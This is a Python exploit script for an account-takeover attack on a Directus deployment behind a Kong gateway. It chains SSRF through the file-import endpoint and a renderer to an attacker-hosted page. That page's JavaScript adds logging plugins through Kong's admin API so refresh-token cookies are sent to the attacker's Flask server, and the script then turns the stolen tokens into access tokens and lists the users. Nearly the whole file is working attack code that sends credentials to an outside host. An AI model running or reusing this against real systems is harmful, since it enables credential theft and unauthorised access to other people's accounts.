#!/usr/bin/python3
from flask import Flask, request, send_file, make_response
from flask_cors import CORS
import time,urllib,threading,requests,sys, logging, json

def runflask():
    app.run(host=lhost, port=int(webport))
def getusers(token):
    print("[+] Getting user list as a test to check the token:")
    resetpass = requests.get("http://{}:{}/users?access_token={}".format(rhost,rport,token))
    print(resetpass.text)
def genaccesstoken(refreshtoken):
    print("[+] Starting the process of access_token generation...")
    accessreq = requests.post("http://{}:{}/auth/refresh".format(rhost,rport), json={"refresh_token":refreshtoken,"mode":"json"})
    if ("access_token" in accessreq.text) and ("refresh_token" in accessreq.text):
        accesstoken = json.loads(accessreq.text)["data"]["access_token"]
        newrefreshtoken = json.loads(accessreq.text)["data"]["refresh_token"]
        print("[$] Got new access_token successfully: {}".format(accesstoken))
        print("[*] Got new refresh_token as well: {}".format(newrefreshtoken))
        getusers(accesstoken)
    else:
        print("[!] Previous refresh_token didn't work. Wait more!")
def httplogger(rhost,rport,lhost):
    print("[+] Sending payload to start Account TakeOver attack against directus...")
    requests.post("http://{}:{}/files/import".format(rhost,rport), json={"url":"http://render:9000/api/render?url=http://{}/rce".format(lhost)})
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
CORS(app)
@app.route('/rce', methods=['GET'])
def rce():
    print('[+] Got request for RCE...')
    resp = make_response(rcehtml,200)
    resp.mimetype = "text/html"
    return resp
@app.route('/post', methods=['POST'])
def post():
    msg = request.form.get('msg')
    err = request.form.get('err')
    if err:
        print("[!] Error occured: {}".format(err))
    elif msg:
        print("[$] Data received: {}".format(msg))
    else:
        print("[!] Unexpected error")
    resp = make_response("", 200)
    resp.mimetype = "text/plain"
    return resp
@app.route('/log', methods=['POST'])
def log():
    reqdata = request.get_data().decode()
    if ("set-cookie" in reqdata) and ("directus_refresh_token" in reqdata):
        logdata = json.loads(reqdata)
        refreshtoken = logdata["response"]["headers"]["set-cookie"].split("=")[1].split(";")[0]
        print("[+] Got the directus_refresh_token: {}".format(refreshtoken))
        genaccesstoken(refreshtoken)
    elif ("cookie" in reqdata) and ("directus_refresh_token" in reqdata):
        logdata = json.loads(reqdata)
        refreshtoken = logdata["request"]["headers"]["cookie"].split("=")[1]
        print("[+] Got the directus_refresh_token: {}".format(refreshtoken))
        genaccesstoken(refreshtoken)
    else:
        print("[!] Got log but it does not contain any token (wait more!)")
    resp = make_response("", 200)
    resp.mimetype = "text/plain"
    return resp


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("(+) usage: {} <RHOST> <RPORT> <LHOST> <WEBPORT>\n".format(sys.argv[0]))
        print("(+) RHOST - Remote server which runs vulnerable version of apigateway")
        print("(+) RPORT - Remote web-server port")
        print("(+) LHOST - Local IP Address to run webserver")
        print("(+) WEBPORT - Local port to run webserver\n")
        sys.exit(-1)
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    webport = sys.argv[4]

rcehtml = '''<html><head><script>
function sendpost(params) {{
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://{lhost}:{webport}/post', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send(params)
}}
function cp() {{
    var xhr = new XMLHttpRequest();
    var data = new FormData();
    data.append("name","http-log");
    data.append("config.http_endpoint","http://{lhost}:{webport}/log");
    data.append("config.method","POST");
    data.append("config.timeout","1000");
    data.append("config.keepalive","1000");
    data.append("config.flush_timeout","2");
    data.append("config.retry_count","15");
    xhr.open('POST', 'http://kong:8001/services/directus_auth_service/plugins', true);
    xhr.send(data)
    xhr.onload = () => {{ sendpost("msg="+xhr.response) }}; 
}}
function cr() {{
    var xhr = new XMLHttpRequest();
    var data = new FormData();
    data.append("name","http-log");
    data.append("config.http_endpoint","http://{lhost}:{webport}/log");
    data.append("config.method","POST");
    data.append("config.timeout","1000");
    data.append("config.keepalive","1000");
    data.append("config.flush_timeout","2");
    data.append("config.retry_count","15");
    xhr.open('POST', 'http://kong:8001/services/directus_users_service/plugins', true);
    xhr.send(data)
    xhr.onload = () => {{ sendpost("msg="+xhr.response) }}; 
}}
cr();
cp();
</script></head></html>'''.format(lhost=lhost,webport=webport)
flask_thread = threading.Thread(target=runflask)
flask_thread.start()
time.sleep(1)
httplogger(rhost,rport,lhost)
